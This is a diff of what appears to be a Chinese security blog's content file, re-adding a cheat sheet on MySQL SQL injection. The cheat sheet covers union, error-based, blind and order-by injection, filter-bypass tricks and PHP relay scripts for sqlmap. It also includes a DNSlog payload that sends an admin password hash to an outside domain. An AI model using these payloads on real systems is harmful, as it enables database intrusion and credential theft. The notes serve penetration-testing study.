-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap -u &quot;http://127.0.0.1/shell.php?s=1&quot; --dbs</span><br></pre></td></tr></table></figure>
-
-<h1 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order-by注入"></a>order-by注入</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><p>regexp</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=(select 1 regexp if(1=1,1,0x00)) 正常</span><br><span class="line">?order=(select 1 regexp if(1=2,1,0x00)) 错误</span><br></pre></td></tr></table></figure>
-<p>updatexml</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=updatexml(1,if(1=1,1,user()),1)  正常</span><br><span class="line">?order=updatexml(1,if(1=2,1,user()),1)  错误</span><br></pre></td></tr></table></figure>
-<p>extractvalue</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=extractvalue(1,if(1=1,1,user())) 正常</span><br><span class="line">?order=extractvalue(1,if(1=2,1,user())) 错误</span><br></pre></td></tr></table></figure>
-<h2 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间</span><br><span class="line">/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒</span><br></pre></td></tr></table></figure>
-
-<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like</span><br><span class="line">&lt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="and-or绕过"><a href="#and-or绕过" class="headerlink" title="and or绕过"></a>and or绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and=&amp;&amp;</span><br><span class="line">or=||</span><br></pre></td></tr></table></figure>
-<h2 id="比较符绕过"><a href="#比较符绕过" class="headerlink" title="比较符绕过"></a>比较符绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line">此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。</span><br><span class="line">那么上面的这条sql语句可以使用greatest变为如下的子句:</span><br><span class="line">select * from users where id = 1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
-
-<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单行注释</span><br><span class="line">--+</span><br><span class="line">--空</span><br><span class="line">#</span><br><span class="line">多行注释</span><br><span class="line">/*多行注释内容*/</span><br><span class="line">若皆被过滤可尝试构造闭合，如</span><br><span class="line">?id=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
-<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在sql注入中+可以替代空格，如</span><br><span class="line">?id=1&#x27;+or+&#x27;1&#x27;=&#x27;1</span><br><span class="line">使用注释符</span><br><span class="line">?id=1&#x27;/**/or/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line">括号绕过</span><br><span class="line">?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;emails&#x27;)),0x7e),1))||&#x27;1</span><br></pre></td></tr></table></figure>
-<h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">join</span><br><span class="line">union select 1,2,3;</span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select 3)C）;</span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select group_concat(user(),&#x27; &#x27;,database(),&#x27; &#x27;,@@datadir))C);</span><br><span class="line"></span><br><span class="line">from for</span><br><span class="line">select substr(database(0 from 1 for 1)</span><br><span class="line">select mid(database(0 from 1 for 1)</span><br><span class="line"></span><br><span class="line">limit的 from或offset</span><br><span class="line">select * from news limit 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
-
-<h2 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十六进制</span><br><span class="line">mysql数据库对十六进制可直接读取</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line">user十六进制为0x7573657273</span><br><span class="line">selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273</span><br></pre></td></tr></table></figure>
-<h2 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大小写</span><br><span class="line">/**/截断</span><br><span class="line">双写</span><br><span class="line">url编码</span><br></pre></td></tr></table></figure>
-
-
-
-
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -1915,6 +1804,117 @@
 ]]></content>
   </entry>
   <entry>
+    <title>sql注入知识记录</title>
+    <url>/posts/ccd55f3a.html</url>
+    <content><![CDATA[<h1 id="sql注入漏洞基本原理"><a href="#sql注入漏洞基本原理" class="headerlink" title="sql注入漏洞基本原理"></a>sql注入漏洞基本原理</h1><p>Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。<br>可能导致数据泄露或数据破坏，缺乏可审计性，甚至导致完全接管主机。</p>
+<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><p>根据注入技术分类有以下五种：</p>
+<div class="note info no-icon flat"><p>布尔型盲注：根据返回页面判断条件真假</p>
+<p>时间型盲注：用页面返回时间是否增加判断是否存在注入</p>
+<p>基于错误的注入：页面会返回错误信息</p>
+<p>联合查询注入：可以使用union的情况下</p>
+<p>堆查询注入：可以同时执行多条语句</p>
+</div>
+
+<p>根据数据获取分类有以下三种：</p>
+<div class="note info no-icon flat"><p>inband<br>利用Web应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</p>
+<p>inference<br>通过Web的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过web应用的其他改变来推断数据。</p>
+<p>out of band (OOB)<br>通过其他传输方式来获得数据，比如DNS解析协议和电子邮件，如dnslog注入</p>
+</div>
+
+
+
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>使用参数化查询。</p>
+<p>数据库服务器不会把参数的内容当作SQL指令的一部分来拼接执行；</p>
+<p>而是在数据库完成SQL指令的编译后才套用参数运行(预编译)。</p>
+<p>避免数据变成代码被执行，时刻分清代码和数据的界限。</p>
+<h1 id="mysql基础知识"><a href="#mysql基础知识" class="headerlink" title="mysql基础知识"></a>mysql基础知识</h1><p>MySQL默认的数据库有<br>sys、mysql、performance_schema、information_schema；<br>information_schema存放着所有的数据库信息(5.0版本以上才有这个库)<br>这个库有三个表：</p>
+<div class="note info no-icon flat"><p>SCHEMATA 该表存放用户创建的所有数据库库名<br>SCHEMA_NAME 字段记录数据库库名<br>TABLES 该表存放用户创建的所有数据库库名和表名<br>TABLE_SCHEMA 字段记录数据库名<br>TABLE_NAME 字段记录表名<br>COLUMNS 该表存放用户创建的所有数据库库名、表名和字段名<br>TABLE_SCHEMA 字段记录数据库名<br>TABLE_NAME 字段记录表名<br>COLUMN_NAME 字段记录字段名</p>
+</div>
+
+<h1 id="sql注入漏洞查找"><a href="#sql注入漏洞查找" class="headerlink" title="sql注入漏洞查找"></a>sql注入漏洞查找</h1><h2 id="常见注入点"><a href="#常见注入点" class="headerlink" title="常见注入点"></a>常见注入点</h2><p>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE参数<br>X-Forwarded-For<br>文件名</p>
+<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### 字符型不一定单引号闭合，可能单引号，双引号，括号排列组合</span><br><span class="line">字符型</span><br><span class="line">?id=1&#x27;		页面返回正常</span><br><span class="line">?id=1 		页面返回不正常</span><br><span class="line"></span><br><span class="line">### 数字型</span><br><span class="line">?id=1 and 1=1		页面返回正常</span><br><span class="line">?id=1 and 1=2		页面返回不正常</span><br></pre></td></tr></table></figure>
+
+<h2 id="测试列数"><a href="#测试列数" class="headerlink" title="测试列数"></a>测试列数</h2><p>以数字型举例  列数为四</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by2	--+返回正常</span><br><span class="line">?id=1 order by 3#			--返回正常</span><br><span class="line">?id=1 order by 4#			--返回正常</span><br><span class="line">?id=1 order by 5#			--返回错误</span><br></pre></td></tr></table></figure>
+<h1 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h1><h2 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,CONCAT_WS(CHAR(32,58,32),user(),database(),version())#</span><br></pre></td></tr></table></figure>
+<h2 id="获取表信息"><a href="#获取表信息" class="headerlink" title="获取表信息"></a>获取表信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,table_name from information_schema.tables where table_schema=&#x27;db_name&#x27; limit 0,1#</span><br></pre></td></tr></table></figure>
+<h2 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,column_name from information_schema.columns where table_schema=%27数据库名%27 and table_name=%27表名%27limit 0,1#</span><br></pre></td></tr></table></figure>
+<h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(name,password) from column_name#</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>判断是否存在报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1/0</span><br></pre></td></tr></table></figure>
+<h2 id="基于主键冲突报错"><a href="#基于主键冲突报错" class="headerlink" title="基于主键冲突报错"></a>基于主键冲突报错</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a</span><br></pre></td></tr></table></figure>
+<h2 id="xpath路径报错"><a href="#xpath路径报错" class="headerlink" title="xpath路径报错"></a>xpath路径报错</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1, concat(0x5c,(select user())))</span><br><span class="line">updatexml(0x3a,concat(1,(select user())),1)</span><br><span class="line">exp(~(SELECT * from(select user())a))</span><br></pre></td></tr></table></figure>
+
+<h2 id="GTID-SUBSET-GTID-SUBTRACT-暂未尝试"><a href="#GTID-SUBSET-GTID-SUBTRACT-暂未尝试" class="headerlink" title="GTID_SUBSET &amp;&amp; GTID_SUBTRACT(暂未尝试)"></a>GTID_SUBSET &amp;&amp; GTID_SUBTRACT(暂未尝试)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GTID_SUBSET(version(), 1)</span><br><span class="line">GTID_SUBSET</span><br><span class="line">?id=1&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class="line">GTID_SUBTRACT</span><br><span class="line">?id=1&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>页面无查询信息数据返回，通过页面响应判断是否存在注入<br>以下手工测试数量过于麻烦，可配合bp的intruder模块爆破</p>
+<p>判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+</span><br><span class="line">1&#x27;and length(database())&gt;=13--+</span><br><span class="line">1&#x27;and length(database())&gt;=14--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="猜测数据库名"><a href="#猜测数据库名" class="headerlink" title="猜测数据库名"></a>猜测数据库名</h2><p>使用逐字符判断的方式获取数据库名；<br>数据库名的范围一般在a<del>z、0</del>9之内，可能还会有特殊字符 “_”、”-“ 等，这里的字母不区分大小写。<br>substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>也可以使用ascii码判断</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h2><p>修改1,1前边的1到20，逐字符猜解出第一个字段的名<br>修改limit的0,1前边的0到20，逐个猜解每个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
+<h2 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在SQL注入的方式 。<br>可以用benchmark，sleep等造成延时效果的函数。<br>如果benkchmark和sleep关键字被过滤了，可以让两个非常大的数据表做笛卡尔积 (opens new window)产生大量的计算从而产生时间延迟；<br>或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and sleep(5) and 1=1--+	页面返回不正常，延时5秒</span><br><span class="line">&#x27; and sleep(5) and 1=2--+	页面返回不正常，不延时</span><br><span class="line"></span><br><span class="line">and if(length(database())&gt;1,sleep(5),1)</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="DNSlog盲注"><a href="#DNSlog盲注" class="headerlink" title="DNSlog盲注"></a>DNSlog盲注</h1><p>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息；<br>DNSlog就是记录用户访问网站域名时，记录DNS和对应的IP的转换访问日志；<br>MySQL Load_File()函数可以发起请求，使用Dnslog接收请求，获取数据；<br>通过SQL执行后，将内容输出到DNSlog中记录起来，然后我们可以在DNSlog平台查询回显数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,load_file(CONCAT(&#x27;\\&#x27;,(SELECT hex(pass) FROM user WHERE name=&#x27;admin&#x27; LIMIT 1),&#x27;.mysql.wintrysec.ceye.io\abc&#x27;))</span><br><span class="line">--Hex编码的目的是减少干扰，域名有一定的规范，有些特殊字符不能带入</span><br></pre></td></tr></table></figure>
+<h1 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h1><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>注入的参数被加密，使用sqlmap的tamper脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://xxx.com/?id=MQ== --tamper base64encode.py --dbs</span><br></pre></td></tr></table></figure>
+
+<h1 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h1><h2 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h2><p>若参数名也被加密，比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。<br>因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.sqlmap注入本地搭建的服务器中转脚本<br>2.中转脚本接收sqlmap注入过来的payload,根据配置进行编码<br>3.将payload与目标地址进行拼接请求该URL</p>
+<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit(0); </span><br><span class="line">$id=$_GET[&quot;id&quot;]; 	//自定义使用base64_encode编码</span><br><span class="line">$id=str_replace(&quot; &quot;,&quot;%20&quot;,$id); </span><br><span class="line">$id=str_replace(&quot;=&quot;,&quot;%3D&quot;,$id); </span><br><span class="line">$url = &quot;http://xxxx?&amp;daxxtae=null&amp;parame=$id&quot;;</span><br><span class="line">echo $url;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, &quot;$url&quot;); </span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); //https请求 不验证hosts</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_PROXY, &#x27;proxy.xxxx.com&#x27;); //代理服务器地址,vps可以不加</span><br><span class="line">curl_setopt($ch, CURLOPT_PROXYPORT, &#x27;8080&#x27;); //代理服务器端口,vps可以不加</span><br><span class="line">$output = curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line">print_r($output);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>sqlmap</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http://127.0.0.1/shell.php?&amp;daxxtae=null&amp;param=xxx&quot; --batch --delay=1 --random-agent --dbs</span><br></pre></td></tr></table></figure>
+
+<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;http://192.168.1.104/sqli/Less-11/index.php&quot;;</span><br><span class="line">$sql = $_GET[s];//获取中转脚本传过来的payload </span><br><span class="line">$s = urlencode($sql);</span><br><span class="line">$params = &quot;uname=admin$s&amp;passwd=aa&quot;;</span><br><span class="line">$ch = curl_init();// 创建一个新cURL资源</span><br><span class="line"> curl_setopt($ch, CURLOPT_URL, $url);//这是你想用PHP取回的URL地址，可以在用curl_init()函数初始化时设置这个选项</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);//https请求 不验证hosts</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);//如果你想把一个头包含在输出中，设置这个选项为一个非零值   </span><br><span class="line">curl_setopt($ch, CURLOPT_USERAGENT, &#x27;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&#x27;);// 在HTTP请求中自定义一个”user-agent”头的字符串</span><br><span class="line">curl_setopt($ch, CURLOPT_TIMEOUT, 15);//为了应对目标服务器的过载，下线，或者崩溃等可能状况。</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><br><span class="line">// 抓取URL并把它传递给浏览器 </span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">// 关闭cURL资源，并且释放系统资源</span><br><span class="line">curl_close($ch);</span><br><span class="line">$a = strlen($output);</span><br><span class="line">//echo $a;</span><br><span class="line">if($a==2846)&#123;</span><br><span class="line">    echo &quot;1&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;2&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>sqlmap</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap -u &quot;http://127.0.0.1/shell.php?s=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<h1 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order-by注入"></a>order-by注入</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><p>regexp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=(select 1 regexp if(1=1,1,0x00)) 正常</span><br><span class="line">?order=(select 1 regexp if(1=2,1,0x00)) 错误</span><br></pre></td></tr></table></figure>
+<p>updatexml</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=updatexml(1,if(1=1,1,user()),1)  正常</span><br><span class="line">?order=updatexml(1,if(1=2,1,user()),1)  错误</span><br></pre></td></tr></table></figure>
+<p>extractvalue</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?order=extractvalue(1,if(1=1,1,user())) 正常</span><br><span class="line">?order=extractvalue(1,if(1=2,1,user())) 错误</span><br></pre></td></tr></table></figure>
+<h2 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常响应时间</span><br><span class="line">/?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like</span><br><span class="line">&lt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="and-or绕过"><a href="#and-or绕过" class="headerlink" title="and or绕过"></a>and or绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and=&amp;&amp;</span><br><span class="line">or=||</span><br></pre></td></tr></table></figure>
+<h2 id="比较符绕过"><a href="#比较符绕过" class="headerlink" title="比较符绕过"></a>比较符绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line">此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。</span><br><span class="line">那么上面的这条sql语句可以使用greatest变为如下的子句:</span><br><span class="line">select * from users where id = 1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
+
+<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单行注释</span><br><span class="line">--+</span><br><span class="line">--空</span><br><span class="line">#</span><br><span class="line">多行注释</span><br><span class="line">/*多行注释内容*/</span><br><span class="line">若皆被过滤可尝试构造闭合，如</span><br><span class="line">?id=1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在sql注入中+可以替代空格，如</span><br><span class="line">?id=1&#x27;+or+&#x27;1&#x27;=&#x27;1</span><br><span class="line">使用注释符</span><br><span class="line">?id=1&#x27;/**/or/**/&#x27;1&#x27;=&#x27;1</span><br><span class="line">括号绕过</span><br><span class="line">?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;emails&#x27;)),0x7e),1))||&#x27;1</span><br></pre></td></tr></table></figure>
+<h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">join</span><br><span class="line">union select 1,2,3;</span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select 3)C）;</span><br><span class="line">union select * from ((select 1)A join (select 2)B join (select group_concat(user(),&#x27; &#x27;,database(),&#x27; &#x27;,@@datadir))C);</span><br><span class="line"></span><br><span class="line">from for</span><br><span class="line">select substr(database(0 from 1 for 1)</span><br><span class="line">select mid(database(0 from 1 for 1)</span><br><span class="line"></span><br><span class="line">limit的 from或offset</span><br><span class="line">select * from news limit 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>
+
+<h2 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十六进制</span><br><span class="line">mysql数据库对十六进制可直接读取</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line">user十六进制为0x7573657273</span><br><span class="line">selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273</span><br></pre></td></tr></table></figure>
+<h2 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大小写</span><br><span class="line">/**/截断</span><br><span class="line">双写</span><br><span class="line">url编码</span><br></pre></td></tr></table></figure>
+
+
+
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>sql-inject</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vulntarget-N勒索病毒靶场练习</title>
     <url>/posts/4fea4d13.html</url>
     <content><![CDATA[<h1 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h1><p><a href="https://blog.csdn.net/csdnmmd/article/details/139614037">https://blog.csdn.net/csdnmmd/article/details/139614037</a><br> vulntarget-n是一个模拟全球化勒索病毒高发环境下的应急响应和取证分析案例，其模拟了一个正常运行的业务服务被勒索病毒攻击的情景：<br>    01、客户在阿里云部署的业务环境<br>    02、今天突然发现首页变成了一个勒索的界面，要求用户支付赎金以解密数据<br>    03、客户发现其中部分重要文件被加密为.vulntarget结尾<br>随即客户要你进行应急响应并取证分析，因为是阿里云的ECS，客户将阿里云ECS实例镜像导出到本地，要求你在明天分析出结果。<br>具体要求如下：<br>    01、分析攻击事件是如何发生的，请给出攻击画像<br>    02、解密勒索<br>    03、恢复原来的index.jsp页面，恢复正常的web服务</p>
@@ -2681,49 +2681,6 @@ w:Rock-y did-nt like that</div>
       </tags>
   </entry>
   <entry>
-    <title>溯源小技巧</title>
-    <url>/posts/7dea39be.html</url>
-    <content><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="溯源反制思路"><a href="#溯源反制思路" class="headerlink" title="溯源反制思路"></a>溯源反制思路</h2><p>反向渗透攻击IP、反向信息收集攻击IP、利用部署的蜜罐获取攻击者信息、溯源钓鱼邮件</p>
-<h2 id="攻击源捕获"><a href="#攻击源捕获" class="headerlink" title="攻击源捕获"></a>攻击源捕获</h2><p>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等。<br>日志与流量分析，异常的通讯流量、攻击源与攻击目标等。<br>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等。<br>邮件钓鱼，获取恶意文件样本、钓鱼网站URL等。<br>蜜罐系统，获取攻击者行为、意图的相关信息。</p>
